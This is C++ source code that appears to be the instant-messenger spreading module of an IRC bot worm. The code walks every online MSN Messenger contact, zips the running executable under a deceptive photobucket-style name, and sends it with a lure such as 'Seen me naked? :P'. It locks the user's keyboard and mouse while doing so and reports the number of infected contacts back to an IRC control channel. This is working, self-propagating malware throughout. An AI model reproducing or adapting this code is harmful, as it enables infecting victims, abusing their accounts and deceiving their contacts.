#include "../Base.h"

#import "MSNMessengerAPI.tlb" named_guids, no_namespace

#define imchan "#test" // Chan for IM Messages

static const char *msg_send[] = {
  "Is this you?",
  "Seen this?",
  "LOL!",
  "OMG!",
  "Should i put this on myspace?",
  "Seen me naked? :P",
  NULL
};

int randget(const char *messages[]) {
	int i = 0;
	for(;messages[i] != NULL;i++);
	return (rand() % i);
}

		char *stristr2(const char *String, const char *Pattern) {
		char *pptr, *sptr, *start;
			unsigned int slen, plen;
		for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			slen >= plen; start++, slen--) {
		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;
			if (slen < plen)
				return (NULL);
		}
		sptr = start;
		pptr = (char *) Pattern;
		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;
		if ('\0' == *pptr)
				return (start);
			}
		}
				return (NULL);
			}
void key_type(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}

void dropfiles(HWND hwnd, char *email){
    char windir[260];
	char szFiles[260];
	char emaildir[MAX_PATH];

	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,"\\pic0382.zip");
	GetWindowsDirectory(emaildir, sizeof(emaildir));
	strcat(emaildir, "\\");
	strcat(emaildir, email);
	strcat(emaildir, ".zip");

	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);
 
	CopyFile(szFiles, emaildir, FALSE);
	strcpy(szFiles, emaildir);
if (::OpenClipboard (hwnd)) {
    ::EmptyClipboard ();
    int nSize = sizeof (DROPFILES) + sizeof (szFiles);
    HANDLE hData = ::GlobalAlloc (GHND, nSize);
    LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
    pDropFiles->pFiles = sizeof (DROPFILES);
#ifdef UNICODE
    pDropFiles->fWide = TRUE;
#else
    pDropFiles->fWide = FALSE;
#endif
    LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
    ::CopyMemory (pData, szFiles, sizeof (szFiles));
    ::GlobalUnlock (hData);
    ::SetClipboardData (CF_HDROP, hData);
    ::CloseClipboard ();
}
	//DeleteFile(emaildir);
}
void contactfuck(char *contact)
{
	IMSNMessenger *pIMessenger = NULL;
	CoInitialize(0);
	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger,
		(void **)&pIMessenger);
	if (SUCCEEDED(hr))
	{
		pIMessenger->AddContact(0, contact);
	}
	pIMessenger->Release();
	CoUninitialize();
}
void imsendmsg(SOCKET btSock)
{
	const char *msgg;
	srand(GetTickCount());
	msgg = *(&msg_send[randget(msg_send)]);
	char fakename[] = "pic0382.zip";
	char windir[MAX_PATH];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir, "\\");
	strcat(windir, fakename);

	IMSNMessenger *pIMessenger = NULL;
	CoInitialize(0);
	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger,
		(void **)&pIMessenger);
	if (SUCCEEDED(hr))
	{
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;
				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					int x = 0;
					for (long i = 0; i < iContacts; i++)
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;
								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								char buf[128];
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								char *pemail;
								pemail = strchr(buf, '@');
								if(pemail != NULL) buf[pemail-buf] = NULL;

								strcat(buf, ".photobucket.com");
									char exepath[MAX_PATH];
									GetModuleFileName(NULL, exepath, MAX_PATH);

									zip_store(exepath, windir, buf);
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void**)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										ShowWindow((HWND) wndIM,0);	
										srand(GetTickCount());										
                                        int i = rand() % sizeof(msgg) / sizeof(msgg[0]);
										key_type((char *)msgg, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);
										Sleep(50);
										dropfiles((HWND) wndIM, buf);
                                        keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);                                     
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);																			
										x++;
									}
									pIMessengerWindow->Release();
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					char buf[128];
					sprintf(buf, "[IM]: Message & file sent to %d contacts!", x);
					SendPacket( btSock, "PRIVMSG %s %s", imchan, buf );
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();

	//return 0;
}

void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
} 
